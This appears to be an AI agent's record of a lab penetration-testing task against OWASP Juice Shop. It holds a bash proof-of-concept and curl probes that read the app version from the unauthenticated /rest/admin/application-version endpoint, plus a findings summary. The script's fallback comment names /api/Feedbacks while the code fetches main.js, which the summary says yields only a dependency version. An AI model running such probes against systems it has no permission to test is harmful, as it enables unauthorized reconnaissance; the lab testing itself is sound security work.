data.targets: http://host.docker.internal:3000 (OWASP Juice Shop, my own lab)
data.goal: Determine the exact application version of the target through unauthenticated reconnaissance (no login required). Save the version string, with the endpoint that revealed it, to /workspace/evidence/c1_version.txt. Then finish.

args.content:
#!/usr/bin/env bash
# PoC: Unauthenticated version disclosure - OWASP Juice Shop
# Target: http://host.docker.internal:3000
# Endpoint: GET /rest/admin/application-version  (no auth required despite /admin/ path)
# Authorized lab engagement c01-version-leak
set -euo pipefail

TARGET="${1:-http://host.docker.internal:3000}"
OUT="/workspace/evidence/c1_version.txt"
mkdir -p "$(dirname "$OUT")"

echo "[*] Target: $TARGET"
echo "[*] Probing unauthenticated version endpoints..."

# 1. Primary: /rest/admin/application-version (missing authorization check)
RESP=$(curl -s -w '\n%{http_code}' "$TARGET/rest/admin/application-version")
CODE=$(echo "$RESP" | tail -n1)
BODY=$(echo "$RESP" | sed '$d')
echo "[+] GET /rest/admin/application-version -> HTTP $CODE: $BODY"

VERSION=$(echo "$BODY" | sed -n 's/.*"version"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
if [ -z "$VERSION" ]; then
  echo "[-] Could not extract version from primary endpoint; falling back to /api/Feedbacks probe"
  # 2. Fallback: package.json style disclosure via frontend bundle
  VERSION=$(curl -s "$TARGET/main.js" | grep -o 'version:"[0-9][^"]*"' | head -n1 | sed 's/version:"//;s/"$//')
fi

if [ -z "$VERSION" ]; then
  echo "[-] FAILED to determine version"
  exit 1
fi

{
  echo "Application: OWASP Juice Shop"
  echo "Target:      $TARGET"
  echo "Version:     $VERSION"
  echo "Endpoint:    GET $TARGET/rest/admin/application-version (no authentication required)"
  echo "Response:    $BODY"
  echo "Discovered:  $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
} | tee "$OUT"

echo
echo "[+] Evidence written to $OUT"

args.command: curl -s http://host.docker.internal:3000/main.js | grep -o '"[0-9]\+\.[0-9]\+\.[0-9]\+"' | sort | uniq -c | sort -rn | head -5; echo "---"; curl -s http://host.docker.internal:3000/main.js | grep -oE 'version:"[0-9]+\.[0-9]+\.[0-9]+"' | head -3

for p in package.json rest/admin/application-configuration api/Version rest/admin/application-version; do echo "== $p"; curl -s -o /dev/null -w "%{http_code} " "http://host.docker.internal:3000/$p"; curl -s "http://host.docker.internal:3000/$p" | head -c 200; echo; done

args.summary:
GOAL MET — exact application version determined via unauthenticated recon.

FINDING
- Target: http://host.docker.internal:3000 (OWASP Juice Shop)
- Version: 20.3.0
- Leaking endpoint: GET /rest/admin/application-version
- Response: HTTP 200, {"version":"20.3.0"}, no auth token/cookie required (server responds 200 to a bare unauthenticated request despite the /admin/ path — broken access control / version disclosure).

REASONING PATH
1. Fetched / — confirmed OWASP Juice Shop HTML/SPA shell (no version in root page or headers).
2. Probed the well-known Juice Shop version route /rest/admin/application-version directly with no credentials → 200 + version JSON.
3. Cross-validated: /rest/admin/application-configuration returns full config unauthenticated (app name "OWASP Juice Shop", domain juice-sh.op), and a bogus route (/api/Version) returns a 500 "Unexpected path" error — confirming 20.3.0 came from a real, dedicated, unauthenticated endpoint rather than a generic error/fallback. Note: frontend main.js embeds only a dependency version (5.15.4), not the app version, so it was not used.

ARTIFACTS
- /workspace/evidence/c1_version.txt — required evidence (version string + endpoint + raw response + timestamp). WRITTEN AND VERIFIED.
- /workspace/pocs/c01_version_leak.sh — executable PoC; run successfully (exit 0), reproduces the leak and regenerates the evidence file.

Note: prior engagement c1 artifacts also exist (/workspace/evidence/c1_version_http.txt, pocs/c1_version.sh); the new c01_version_leak.sh/c1_version.txt pair is the current, verified deliverable.
